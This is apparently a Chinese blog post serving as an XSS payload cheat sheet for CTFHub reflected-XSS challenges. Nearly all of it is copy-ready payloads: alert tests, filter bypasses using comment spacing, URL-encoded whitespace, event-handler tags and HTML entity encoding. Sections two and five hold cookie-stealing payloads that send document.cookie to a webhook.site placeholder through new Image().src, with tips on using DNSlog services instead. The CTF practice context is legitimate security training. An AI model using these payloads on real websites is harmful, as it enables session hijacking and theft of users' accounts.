---
title: XSS Payload速查表
date: 2026-10-04
categories: weifangfalun
tags: weifangfalun
---

# XSS Payload 速查表（CTFHub刷题专用）
 适合反射型XSS，包含基础测试、空格过滤、script标签过滤，OOB外带，直接复制使用
 
## 一、基础测试Payload（无任何过滤，验证漏洞是否存在）
<script>alert(1)</script>
< img src=x onerror=alert(1)>
<svg onload=alert(1)>
- 作用：弹出 1 ，证明页面可以执行JS，存在XSS漏洞。
 
## 二、空格过滤专用
 核心替换： /**/  代替空格
<img/**/src=x/**/onerror=alert/**/(1)>
外带Cookie完整版（直接用于Bot拿flag）
<img/**/src=x/**/onerror="new/**/Image().src='https://webhook.site/你的地址?c='+document.cookie">

其他空白替代（URL编码，地址栏使用）
-  %09  Tab制表符
-  %0a  换行
-  %0d  回车
示例：
<img%09src=x%09onerror=alert(1)>

## 三、过滤标签（不能用script标签）
优先使用事件触发，不需要 <script>

< img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<video src=x onerror=alert(1)>

## 四、引号过滤 / 单双引号被转义
不用引号版本
< img src=x onerror=alert(1)>

## 五、OOB数据外带Payload（CTF Bot题型，拿Cookie核心！）
把Cookie发送到webhook/dnslog，用来获取flag
1. img onerror 版本（推荐，兼容性最好）
< img src=x onerror="new Image().src='https://webhook.site/你的地址?c='+document.cookie">
2. script标签版本（无过滤时用）
<script>new Image().src="https://webhook.site/你的地址?c="+document.cookie</script>

## 六、编码绕过（过滤关键字时）
HTML实体编码
 alert  →  &#97;&#108;&#101;&#114;&#116; 
示例：
< img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

## 七、常用JS函数（写payload必背）
1. alert(1) ：弹窗测试，验证JS执行
2. document.cookie ：读取页面Cookie（拿flag核心）
3. new Image().src="url" ：发起GET请求，无CORS跨域限制，OOB外带首选
4. window.open(url) ：新开页面发送数据（容易中断，不推荐优先用）
5. fetch(url) ：AJAX请求，容易跨域失败
 
## 八、刷题小口诀
先alert测漏洞，有过滤换标签；
空格删掉用/**/，script被拦img上；
Bot题要外带cookie，new Image最稳当。
 
## 九、常见踩坑速记
1. Bot是无头浏览器，alert弹窗拿不到flag，必须OOB外带
2. new Image()  不会触发跨域报错，fetch/xhr容易被CORS拦截
3. 一旦Cookie设置HttpOnly，JS无法读取document.cookie
4. webhook.site国外站点，Bot大概率访问超时，备选：DNSlog、ceye
